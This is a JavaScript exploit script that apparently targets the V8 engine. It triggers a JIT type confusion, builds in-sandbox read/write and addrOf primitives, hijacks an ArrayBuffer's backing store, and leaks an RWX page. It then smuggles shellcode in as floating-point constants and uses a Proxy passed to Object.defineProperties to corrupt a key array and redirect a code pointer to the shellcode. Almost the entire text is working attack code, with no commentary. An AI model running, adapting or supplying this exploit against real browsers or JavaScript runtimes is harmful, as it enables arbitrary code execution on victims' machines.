const conv_ab = new ArrayBuffer(8);
const conv_f64 = new Float64Array(conv_ab);
const conv_u64 = new BigUint64Array(conv_ab);

const EMPTY_PROPERTIES_ADDR = 0x7e5n;
const MAP_JSARR_PACKED_DOUBLES_ADDR = 0x100ba71n;
const FIXED_ARRAY = 0x38c002an;
let FIXED_OBJ_ARRAY = 0x8d00018n;
const EVIL_SMI = (Number(FIXED_ARRAY) / 2);
let flag = {};

function itof(x) {
  conv_u64[0] = BigInt(x);
  return conv_f64[0];
}

function ftoi(x) {
  conv_f64[0] = x;
  return conv_u64[0];
}

function spin(ms) {
  let end = Date.now() + ms;
  while(Date.now() < end);
};

function gc() {
  new ArrayBuffer(1);
  new ArrayBuffer(1);
  new ArrayBuffer(2 ** 30);
}

const spray = new Array(0x4fe0000/8); //FixedDoubleArray address should be constant
spray[2] = itof(MAP_JSARR_PACKED_DOUBLES_ADDR << 8n);
spray[3] = itof(FIXED_OBJ_ARRAY >> 8n);

function trigger(obj, x) {  
  let y = x[0]; //x must be an HeapObj
  y += 0.1;
  obj.p = x; //no check here :)
  return y;
}

let target = { p: {a: 1} };
target.p = [1.1, 2.2, 3.3];

function get(x) {
  return x.p[0];
}

function set(x, y) {
  x.p[0] = y;
}

for (let i = 0; i < 1000; i++) {
  get(target);
  set(target, 1.1);
}

for (let i = 0; i < 1000; i++) {
  trigger(target, [1.1]);
}

spin(1000);

trigger(target, EVIL_SMI);

function caged_write(x, y) {
  spray[3] = itof((BigInt(x)-7n) << 8n);
  const tmp = ftoi(get(target)) & 0xffffffff00000000n;
  set(target, itof(tmp | BigInt(y)));
}

function caged_read(x) {
  spray[3] = itof((BigInt(x)-7n) << 8n);
  return (ftoi(get(target))) & 0xffffffffn;
}

const spray2 = new Array(0x4fe0000/8);
spray2[0] = spray2;

const marker = caged_read(FIXED_OBJ_ARRAY-8n);

if (marker != 0x5ddn) {
  print("Unexpected obj array marker: " + marker.toString(16) + ", fixing offset...");
  FIXED_OBJ_ARRAY = 0x8cc0018n;
}

function addrOf(obj) {
  spray2[0] = obj;
  return Number(caged_read(FIXED_OBJ_ARRAY)) & 0xffffffff;
}

let sbox_buf = new ArrayBuffer(0x1337);

function build_primitives() {
  let sbox_buf_addr = addrOf(sbox_buf) & ~1;

  caged_write(sbox_buf_addr + 0x14, 0xe0000000);
  caged_write(sbox_buf_addr + 0x18, 0xffffffff);

  caged_write(sbox_buf_addr + 0x1c, 0xe0000000);
  caged_write(sbox_buf_addr + 0x20, 0xffffffff);

  caged_write(sbox_buf_addr + 0x24, 0x00000000);
  caged_write(sbox_buf_addr + 0x28, 0x00000000);
}
build_primitives();
print("primitives built");
gc();
gc();

let mem = new DataView(sbox_buf);
function r32(a){ return mem.getUint32(a, true); }
function w32(a,v){ mem.setUint32(a, v, true); }
function hex(x){ return '0x'+(x).toString(16); }
function addr(o){ return addrOf(o)-1; }
function tagged(o){ return (addr(o)|1); }

function shellcode() {
  return [2.0006680287171578e-246,1.9596884820320812e-246,1.9580068548851356e-246,1.9580144428302946e-246,1.939986469186437e-246,1.9533743781704523e-246,1.999572318714405e-246,1.9895156972227067e-246,1.9322135958150902e-246];
}

function leak() {
  let arr = [itof(0x300000335n), itof(0x8000000f00000n), itof(0x56500080040n), itof(0xd7a4n)];
  let arr_data = addrOf(arr) + 0x24;
  let fake_arr = [{}, {}, {}];
  w32(addrOf(fake_arr) - 0x69 + 8, arr_data);
  str = fake_arr[0];

  for (let i = 0; i < 1000000; i++) {
    shellcode();
  }

  let backing = new ArrayBuffer(0x200000);
  let uint8_arr = new Uint8Array(backing);
  let uint64_arr = new BigUint64Array(backing);

  for (let i = 0; i < 0x180000; i++) {
    uint8_arr[i] = str.charCodeAt(i);
  }
  let base = 0x70008;
  let ret = 0;

  for (let i=0x70000/8; i < 0x180000/8; i+=4) {    
    if ((uint64_arr[i] & 0xf00fn) != 0n) continue;
    if (uint64_arr[i+1] == 0x200n && uint64_arr[i+2] == 0xbadbad0000000000n && uint64_arr[i+3] == 0x1n) {
      if (uint64_arr[i] > ret)
        ret = uint64_arr[i];
      print(ret.toString(16));
    }
  }
  if (ret == 0) {
    print("Leak failed; crashing...");
    r32(0xdeadbeef);
  }
  return ret;
}

let rwx = leak() + 0x56n;
print("RWX page: 0x" + rwx.toString(16));

const k0=Symbol('k0'),k1=Symbol('k1'),k2=Symbol('k2');
const keys=[k0,k1,k2];
const keyTags=[tagged(k0),tagged(k1),tagged(k2)];
const keysElems=(r32(addr(keys)+8)&~1)>>>0;
const sample=[k0,k1,k2];
const sampleElems=(r32(addr(sample)+8)&~1)>>>0;
const fixedArrayMap=r32(sampleElems);

let ownKeysMarker=0;
let patched=false;
let called = 0;

const descTarget={
  [k0]: {value:1, enumerable:true, configurable:true, writable:true},
  [k1]: {value:2, enumerable:true, configurable:true, writable:true},
  [k2]: {value:3, enumerable:true, configurable:true, writable:true},
};

const props = new Proxy(descTarget, {
  ownKeys(){
    ownKeysMarker=addr({});
    return keys;
  },
  get(target, prop, receiver){
    if (!patched && prop===k0) {
      const getMarker=addr({});
      let patchedCount=0;
      const centers=[ownKeysMarker, getMarker];
      
      for (const center of centers){
        const start=(center-0x20000);
        const end=(center+0x20000);
        for(let p=start; p<end; p+=4){
          if (r32(p+0)!==fixedArrayMap) continue;
          if (r32(p+4)!==(3<<1)) continue;
          if (r32(p+8)!==keyTags[0]) continue;
          if (r32(p+12)!==keyTags[1]) continue;
          if (r32(p+16)!==keyTags[2]) continue;
          
          if (p===keysElems || p===sampleElems) continue;
          // Extend list by one and make the OOB slot alias key0.
          print(hex(p), 'looks like a match, patching it');
          w32(p+4, (4<<1));
          w32(p+20, keyTags[2]);
          patchedCount++;
        }
      }
      patched=true;
      print('patched', patchedCount);
    }

    called++;
    print(called);
    if(called == 4){
    w32(0x10032c1 + 0x38, Number(rwx) & 0xffffffff);
    w32(0x10032c1 + 0x38 + 4, Number(rwx >> 32n));
    }
    return Reflect.get(target, prop, receiver);
  }
});
const out={};
gc();

let arr = [1.1, 2.2, 3.3];
arr.push(4.4);

Object.defineProperties(out, props);